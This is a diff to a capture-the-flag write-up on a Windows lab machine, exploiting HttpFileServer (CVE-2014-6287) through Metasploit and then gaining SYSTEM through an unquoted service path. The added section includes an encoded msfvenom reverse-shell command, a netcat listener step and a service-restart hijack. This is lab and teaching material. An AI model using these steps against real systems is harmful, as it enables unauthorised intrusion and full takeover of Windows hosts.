@@ -54,8 +54,6 @@ searchsploit HttpFileServer
 
 This revealed an exploit targeting HttpFileServer 2.3.x, associated with CVE-2014-6287, which allows remote command execution via a crafted HTTP request.
 
-A Python exploit script (49125.py) was identified and reviewed. The exploit works by injecting commands into the vulnerable search parameter of the web application.
-
 # 5. Exploitation Preparation & Execution
 
 Next we start up Metasploit and we search for Rejetto 
@@ -72,4 +70,47 @@ Next we set LHOST to our ip address and LPORT to a free port.
 
 ![pwd](first-flag.png)
 
+# 6. Privilege Escalation
 
+To enumerate this machine we are asked to download a powershell script called PowerUp which is used to evaluate a Windows machine and determine any abnormalities.
+
+![wget](wget.png)
+
+After downloading it we can upload it into Metasploit and get a PowerShell shell.
+
+![upload](upload.png)
+
+```Invoke-AllChecks``` - outputs any vulnerabilites that can be discovered, as well as descriptors for any abuse functionalities.
+
+One of the questions we are asked in this room is which service has the CanRestart option set to True and also shows up as an unquoted service path vulnerability.
+
+![care9](care9.png)
+
+The anser is the AdvancedSystemCareService9
+
+Next we are told to use msfvenom to generate a reverse shell as a Windows executable using the following command:
+
+```msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe```
+
+![advanced](advanced.png)
+
+We navigate to the IObit directory where the AdvancedSystemCareService9 is located and we upload our executable.
+
+![iobit](iobit.png)
+
+We start a netcat listener on port 4443 which is the same as the LPORT paramater in the previous command.
+
+![nc](nc.png)
+
+Now all we have to do is stop the service AdvancedSystemCareService9 and then restart it but this time our reverse shell will start instead because the Advanced.exe is before the
+AdvancedSystemCareService9.
+
+![sc](sc.png)
+
+And we get our reverse shell on our listener.
+
+![sys32](sys32.png)
+
+All thats left is to find the root flag.
+
+![root](root.png)
